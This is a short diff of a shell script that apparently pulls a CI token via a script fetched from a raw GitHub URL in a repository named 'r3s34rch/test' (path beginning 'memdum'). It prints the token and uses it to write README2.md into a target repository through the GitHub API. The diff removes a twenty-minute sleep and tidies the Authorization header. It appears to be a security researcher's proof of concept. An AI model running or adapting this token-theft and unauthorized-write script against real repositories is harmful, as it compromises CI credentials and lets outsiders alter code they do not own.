@@ -7,7 +7,6 @@ TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum
 echo "-----------------------------------------------------------------"
 echo "${TOKEN_VAL}"
 echo "-----------------------------------------------------------------"
-sleep 20m
 
 curl \
   -H "Accept: application/vnd.github.v3+json" \
@@ -17,7 +16,7 @@ curl \
 curl \
     -X PUT \
     -H "Accept: application/vnd.github.v3+json" \
-    -H "Authorization: token  $TOKEN_VAL" \
+    -H "Authorization: token $TOKEN_VAL" \
     "https://api.github.com/repos/${REPO}/contents/README2.md" \
     -d '{"message":"message","content":"'$(echo content|base64)'", "sha":"SHA_FROM_ABOVE"}'
             
